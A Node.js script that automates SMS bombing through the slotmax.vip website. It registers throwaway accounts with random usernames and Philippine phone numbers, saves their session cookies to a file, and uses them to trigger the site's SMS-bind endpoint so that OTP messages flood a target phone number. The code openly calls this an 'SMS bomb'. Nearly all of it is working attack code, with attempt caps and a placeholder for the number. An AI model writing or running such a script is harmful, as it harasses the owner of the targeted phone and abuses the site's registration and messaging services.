const axios = require('axios');
const fs = require('fs');

function log() {
    console.log("\x1b[32m%s\x1b[0m", ...arguments); // Green
}

function errorLog() {
    console.error("\x1b[31m%s\x1b[0m", ...arguments); // Red
}

let file = [];
try {
    file = JSON.parse(fs.readFileSync('eytokens.json', 'utf-8')) || [];
} catch (err) {
    log("⚠️ Failed to read 'eytokens.json'. Initializing new file.");
}

function delay(ms) {
    return new Promise(function(resolve) {
        setTimeout(resolve, ms);
    });
}

function randomName() {
    var name = ["nega"];
    return name[Math.floor(Math.random() * name.length)] + 
           Array(6).fill(0).map(function() { return Math.random().toString(36).charAt(2); }).join('');
}

function save(data) {
    try {
        fs.writeFileSync('eytokens.json', JSON.stringify(data, null, 4), 'utf-8');
    } catch (err) {
        errorLog("❌ Error saving file:", err.message);
    }
}

var errorCreating = false;

var headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json',
    'accept-language': 'en-US',
    'requestfrom': 'H5',
    'origin': 'https://slotmax.vip',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
};

function create(tuloy) {
    return new Promise(function(resolve, reject) {
        try {
            var number = "9" + Array(9).fill(0).map(function() { return Math.floor(Math.random() * 10); }).join('');
            var username = randomName();

            var config = {
                method: 'POST',
                url: 'https://slotmax.vip/api/user/custom/register',
                headers: Object.assign({}, headers, { 'referer': 'https://slotmax.vip/register' }),
                data: {
                    username: username,
                    "password": "3b64b35b9ccdc8495e585f83d6d726bb",
                    "code": "",
                    "phone": number,
                    "areaCode": "63"
                }
            };

            axios.request(config).then(function(response) {
                var cookie = response.headers["set-cookie"] ? response.headers["set-cookie"].join('; ') : null;
                if (cookie) {
                    log("✅ Account created:", username, "| Cookie:", cookie);
                    file.push(cookie);
                    save(file);
                    resolve();
                } else {
                    throw new Error("Cookie not received.");
                }
            }).catch(function(err) {
                throw err;
            });
        } catch (err) {
            if (!tuloy) {
                log("💣 Proceeding to SMS bomb...");
                errorCreating = true;
            } else {
                log("❌ Account creation failed. Try refreshing IP.");
            }
            reject(err);
        }
    });
}

function smsotp(phone) {
    return new Promise(function(resolve, reject) {
        try {
            if (file.length === 0) {
                throw new Error("No tokens available.");
            }

            var cookie = file[Math.floor(Math.random() * file.length)];

            var config = {
                method: 'POST',
                url: 'https://slotmax.vip/api/user/sms/send/bind',
                headers: Object.assign({}, headers, { cookie: cookie, 'referer': 'https://slotmax.vip/wallet' }),
                data: {
                    phone: phone,
                    "areaCode": "63"
                }
            };

            axios.request(config).then(function(response) {
                log("📩 SMS Response:", JSON.stringify(response.data, null, 4));
                resolve();
            }).catch(function(err) {
                throw err;
            });
        } catch (err) {
            errorLog("❌ SMS Error:", err.message || err);
            reject(err);
        }
    });
}

function createAccount(tuloy) {
    let attempts = 0;
    function loop() {
        if ((tuloy || !errorCreating) && attempts < 5) { // Limit to 5 attempts
            attempts++;
            create(tuloy).then(function() {
                return delay(5000); // Increased delay to avoid rate limits
            }).then(loop).catch(loop);
        }
    }
    loop();
}

function autoBomb() {
    createAccount();
    var exceeded = false;
    let smsAttempts = 0;

    setTimeout(function() {
        exceeded = true;
    }, 120 * 1000);

    function loop() {
        if (errorCreating && !exceeded && smsAttempts < 5) { // Limit to 5 SMS attempts
            smsAttempts++;
            smsotp("YOUR_PHONE_NUMBER").then(loop).catch(loop); // Replace with your number
        }
    }
    loop();
}

autoBomb();
